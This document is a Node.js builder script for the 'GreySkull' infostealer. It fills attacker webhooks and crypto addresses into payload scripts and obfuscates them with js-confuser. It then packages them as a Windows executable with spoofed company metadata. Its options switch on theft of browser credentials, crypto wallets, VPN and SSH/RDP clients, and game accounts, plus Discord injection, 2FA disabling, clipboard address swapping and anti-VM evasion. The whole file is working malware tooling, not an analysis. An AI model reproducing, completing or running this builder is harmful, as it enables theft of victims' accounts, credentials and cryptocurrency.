const fs = require("fs");
const path = require("path");
const axios = require("axios");
const { build, Platform, Arch } = require("electron-builder");
const sourceDirectory = "./script";
const jsConfuser = require("js-confuser");

async function obfufirst(config) {
  const webhook = config.webhook,
    author = config.author ?? "KSCH58",
    license = config.license ?? "MIT IC",
    description = config.description ?? "please don't use drug",
    appCompanyName = config.appCompanyName ?? "LegalSec",
    appLegalCopyright = config.appLegalCopyright ?? "copyright KSCH inc",
    appFileDescription = config.description ?? "GreySkull simp file",
    version = config.version ?? "1.5.9",
    api = config.api ?? "%API_URL%",
    name = config.name ?? "GreySkull",
    disable2fa = config.disable2fa ?? "false",
    clientemail = config.clientemail ?? "kschdediscord@gmail.com",
    automailchanger = config.automailchanger ?? "false",
    blockdebug = config.debug ?? "no",
    game = config.games ?? "no",
    launchers = config.launcher ?? "no",
    inject = config.inject ?? "no",
    clients = config.clients ?? "yes",
    wallets = config.wallets ?? "yes",
    vpn = config.vpn ?? "yes",
    sysinfo = config.sysinfo ?? "no",
    social = config.social ?? "no",
    browsers = config.browsers ?? "no",
    fakeerror = config.fakeerror ?? "no",
    walletswaper = config.walletswaper ?? "no",
    trollsound = config.trollsound ?? "none",
    setdisabler = config.setdisabler ?? "no",
    chromeinjection = config.chromeinjection ?? "no",
    trollimage = config.trollimage ?? "no",
    messagefakeerror = config.msgfakeerror ?? "Application Error",
    ltc = config.ltc ?? "",
    btc = config.btc ?? "",
    eth = config.eth ?? "",
    dash = config.dash ?? "",
    xlm = config.xlm ?? "",
    bch = config.bch ?? "",
    xrp = config.xrp ?? "",
    neo = config.neo ?? "",
    doge = config.doge ?? "";
  try {
    const tosend = {
      username: "GreySkull",
      avatar_url:
        "https://raw.githubusercontent.com/KSCH58/Assets-of-god/main/dad36dd5-456e-41fd-9dd2-a07655be72b6.png",
      embeds: [
        {
          color: 10038562,
          description: `[<:nova:1132934190032244786> GreySkull Configuration](https://t.me/Sordeal)`,
          fields: [
            {
              name: "**Files Name:**",
              value: `\`${name}\``,
              inline: true,
            },
            {
              name: "**Chrome Injection:**",
              value: `\`${
                chromeinjection == "yes" ? "Enabled ☑️" : "Disabled ❌"
              }\``,
              inline: true,
            },
            {
              name: "**2FA Disabler:**",
              value: `\`${
                disable2fa == "true" ? "Enabled ☑️" : "Disabled ❌"
              }\``,
              inline: true,
            },
            {
              name: "**Auto Mail Changer:**",
              value: `\`${
                automailchanger == "true" ? "Enabled ☑️" : "Disabled ❌"
              }\``,
              inline: true,
            },
            {
              name: "**Anti Debug & Anti VM:**",
              value: `\`${
                blockdebug == "yes" ? "Enabled ☑️" : "Disabled ❌"
              }\``,
              inline: true,
            },
            {
              name: "**Games Stealer:**",
              value: `\`${game == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
              inline: true,
            },
            {
              name: "**Launchers Stealer:**",
              value: `\`${launchers == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
              inline: true,
            },
            {
              name: "**Inject into discord & Exodus & Atomic Clients:**",
              value: `\`${inject == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
              inline: true,
            },
            {
              name: "**Steal SFTP / SSH / RDP Clients controler:**",
              value: `\`${clients == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
              inline: true,
            },
            {
              name: "**Steal Wallets:**",
              value: `\`${wallets == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
              inline: true,
            },
            {
              name: "**Steal VPN:**",
              value: `\`${vpn == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
              inline: true,
            },
            {
              name: "**Steal Systeme informations**",
              value: `\`${sysinfo == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
              inline: true,
            },
            {
              name: "**Steal social app:**",
              value: `\`${social == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
              inline: true,
            },
            {
              name: "**Steal Browsers Credentials:**",
              value: `\`${browsers == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
              inline: true,
            },
            {
              name: "**Fake Error:**",
              value: `\`${fakeerror == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
              inline: true,
            },
            {
              name: "**Swap Crypto Address:**",
              value: `\`${
                walletswaper == "yes" ? "Enabled ☑️" : "Disabled ❌"
              }\``,
              inline: true,
            },
          ],
          footer: {
            text: "@GreySkull | https://t.me/Sordeal",
          },
        },
      ],
    };
    await axios({
      url: config.webhook,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      data: tosend,
    });
  } catch (e) {}

  const destinationDirectory = "./Build/script/" + name;

  const copyDirectory = (source, destination) => {
    if (!fs.existsSync(destination)) {
      fs.mkdirSync(destination);
    }
    const files = fs.readdirSync(source);
    files.forEach((file) => {
      const sourceFilePath = path.join(source, file);
      const destinationFilePath = path.join(destination, file);

      if (fs.statSync(sourceFilePath).isFile()) {
        fs.copyFileSync(sourceFilePath, destinationFilePath);
      } else if (fs.statSync(sourceFilePath).isDirectory()) {
        copyDirectory(sourceFilePath, destinationFilePath);
      }
    });
  };

  const webpackthisshit = async (directory) => {
    await obfuscateFilesbis(directory);
  };
  const obfuscateFilesbis = async (directory) => {
    const files = fs.readdirSync(directory);
    for (const file of files) {
      const filePath = path.join(directory, file);
      if (fs.statSync(filePath).isDirectory()) {
        await obfuscateFilesbis(filePath);
      } else if (
        file.endsWith(".js") &&
        !filePath.includes("node_modules") &&
        !file.includes("build.js")
      ) {
        const originalCode = fs.readFileSync(filePath, "utf-8");
        let counter = 0;
        const obfuscatedCode = await jsConfuser.obfuscate(originalCode, {
          target: "node",
          controlFlowFlattening: 0,
          minify: false,
          globalConcealing: true,
          stringCompression: 1,
          stringConcealing: 0.9,
          stringEncoding: 0.3,
          stringSplitting: 1,
          deadCode: 0,
          calculator: 0.5,
          compact: true,
          movedDeclarations: false,
          objectExtraction: false,
          stack: true,
          duplicateLiteralsRemoval: 0,
          flatten: false,
          dispatcher: true,
          opaquePredicates: 0,
          shuffle: { hash: 0.6, true: 0.6 },
          renameVariables: false,
          renameGlobals: false,
        });
        await fs.writeFileSync(filePath, obfuscatedCode);
      }
    }
  };
  const replaceBat = (filePath) => {
    const fileContent = fs.readFileSync(filePath, "utf-8");
    const replacedContent = fileContent.replace(
      /%DESTINATION%/g,
      destinationDirectory
    );
    fs.writeFileSync(filePath, replacedContent);
  };
  const replaceCFG = (filePath) => {
    const fileContent = fs.readFileSync(filePath, "utf-8");
    const replacedContent = fileContent
      .replace(/%DESCRIPTION%/g, description)
      .replace(/%AUTHOR%/g, author)
      .replace(/%LICENSE%/g, license)
      .replace(/%APPCOMPAGNYNAME%/g, appCompanyName)
      .replace(/%COPYRIGHT%/g, appLegalCopyright)
      .replace(/%FILEDESCRIB%/g, appFileDescription)
      .replace(/%VERSION%/g, version)
      .replace(/%VERSIONPRODUCT%/g, version);
    fs.writeFileSync(filePath, replacedContent);
  };
  const replaceWebhook = (filePath) => {
    const fileContent = fs.readFileSync(filePath, "utf-8");
    const replacedContent = fileContent
      .replace(/%WEBHOOK%/g, webhook)
      .replace(/%SETTINGS_DISABLER%/g, setdisabler)
      .replace(/%CHROME_INJECTION%/g, chromeinjection)
      .replace(/%CLIENT_EMAIL%/g, clientemail)
      .replace(/%AUTO_MAIL_CHANGER%/g, automailchanger)
      .replace(/%DISABLE_2FA%/g, disable2fa)
      .replace(/%DEBUG_OPTIONS%/g, blockdebug)
      .replace(/%GAMES_OPTIONS%/g, game)
      .replace(/%LAUNCHERS_OPTIONS%/g, launchers)
      .replace(/%INJECT_OPTIONS%/g, inject)
      .replace(/%CLIENTS_OPTIONS%/g, clients)
      .replace(/%WALLETS_OPTIONS%/g, wallets)
      .replace(/%VPN_OPTIONS%/g, vpn)
      .replace(/%SYSINFO_OPTIONS%/g, sysinfo)
      .replace(/%SOCIALAPP_OPTIONS%/g, social)
      .replace(/%BROWSERS_OPTIONS%/g, browsers)
      .replace(/%FAKEERROR_OPTIONS%/g, fakeerror)
      .replace(/%SWAP_OPTIONS%/g, walletswaper)
      .replace(/%TROLL_SOUND%/g, trollsound)
      .replace(/%TROLL_IMAGE%/g, trollimage)
      .replace(/%FAKE_ERROR_MSG%/g, messagefakeerror)
      .replace(/%API_URL%/g, api)
      .replace(/%LTC_ADD%/g, ltc)
      .replace(/%BTC_ADD%/g, btc)
      .replace(/%ETH_ADD%/g, eth)
      .replace(/%XLM_ADD%/g, xlm)
      .replace(/%DASH_ADD%/g, dash)
      .replace(/%BCH_ADD%/g, bch)
      .replace(/%XRP_ADD%/g, xrp)
      .replace(/%NEO_ADD%/g, neo)
      .replace(/%DOGE_ADD%/g, doge);
    fs.writeFileSync(filePath, replacedContent);
  };

  const traverseFiles = (directory) => {
    const files = fs.readdirSync(directory);
    files.forEach((file) => {
      const filePath = path.join(directory, file);
      if (fs.statSync(filePath).isDirectory()) {
        traverseFiles(filePath);
      } else if (file.endsWith(".js") && !filePath.includes("node_modules")) {
        replaceWebhook(filePath);
      } else if (file.endsWith(".json") && !filePath.includes("node_modules")) {
        replaceCFG(filePath);
      } else if (file.endsWith("build.bat")) {
        replaceBat(filePath);
      }
    });
  };
  copyDirectory(sourceDirectory, destinationDirectory);
  await traverseFiles(destinationDirectory);
  await webpackthisshit(destinationDirectory);

  return destinationDirectory;
}

async function building(dest, config) {
  let name = config.name ?? "GreySkull";
  let icon =
    "https://cdn.discordapp.com/attachments/1138396644270932061/1142791529887453274/lilnova.ico";
  try {
    if (icon) {
      const response = await axios.get(icon, { responseType: "arraybuffer" });
      const iconBuffer = Buffer.from(response.data);
      const iconSize = iconBuffer.length;

      if (iconSize <= 500 * 1024) {
        fs.writeFileSync(`${dest}/node.ico`, iconBuffer);
      }
    }

    const builderConfig = {
      targets: Platform.WINDOWS.createTarget(null, Arch.x64),
      config: {
        appId: "win32",
        productName: `${name}`,
        win: {
          artifactName: `${name}.exe`,
          target: "portable",
          icon: `${dest}/node.ico`,
        },
        compression: "normal",
        buildVersion: "1.0.0",
        electronVersion: "17.1.0",
        nodeGypRebuild: false,
        npmRebuild: true,
        directories: {
          app: `${dest}`,
          output: `./Build/dist/${name}`,
        },
      },
    };

    await build(builderConfig);

    fs.unlinkSync(`./Build/dist/${name}/builder-debug.yml`);
    fs.unlinkSync(`./Build/dist/${name}/builder-effective-config.yaml`);
    fs.rmSync(`./Build/dist/${name}/win-unpacked`, { recursive: true });
    fs.rmSync(`${dest}`, { recursive: true }); fs.rename(`./Build/dist/${name}/${name}.exe`, `./${name}.exe`, (err) => {
      if (err) {
        console.error('File inside : ./Build/dist');
      } else {
        console.log('Files: ' + name);
      }
    });
  } catch (err) {console.log(err)}
}

async function main(config) {
  console.log("starting obfuscation...")
  const obfupath = await obfufirst(config);
  console.log("Building?")
  await building(obfupath, config);
  console.log("Finished.")
}

module.exports = {
  main,
};
